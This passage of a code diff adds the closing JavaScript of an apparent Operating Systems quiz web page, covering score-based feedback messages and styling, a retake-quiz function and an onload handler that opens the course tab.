+            } else if (percentage >= 50) {
+                msgEl.innerText = "Good effort. You know the basics, but I recommend reviewing the course material to strengthen your knowledge of complex topics like deadlocks and virtual memory.";
+                msgEl.classList.add('bg-yellow-50', 'text-yellow-800', 'border-yellow-200');
+                iconContainer.classList.add('bg-yellow-100');
+                iconEl.classList.add('fa-solid', 'fa-star-half-stroke', 'text-yellow-500');
+            } else {
+                msgEl.innerText = "Needs improvement. Operating Systems is a complex subject. Take your time to re-read the course section before trying again.";
+                msgEl.classList.add('bg-red-50', 'text-red-800', 'border-red-200');
+                iconContainer.classList.add('bg-red-100');
+                iconEl.classList.add('fa-solid', 'fa-book-open-reader', 'text-red-500');
+            }
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function retakeQuiz() {
+            // Reset next button styles just in case
+            const nextBtn = document.getElementById('next-btn');
+            nextBtn.innerHTML = 'Next Question <i class="fa-solid fa-chevron-right ml-2"></i>';
+            nextBtn.classList.replace('bg-indigo-600', 'bg-blue-600');
+            nextBtn.classList.replace('hover:bg-indigo-700', 'hover:bg-blue-700');
+            
+            startQuiz();
+        }
+
+        // Initialize state on load
+        window.onload = () => {
+            switchTab('course'); // Ensure we start on the course tab
+        }
+    </script>
 </body>
 </html>
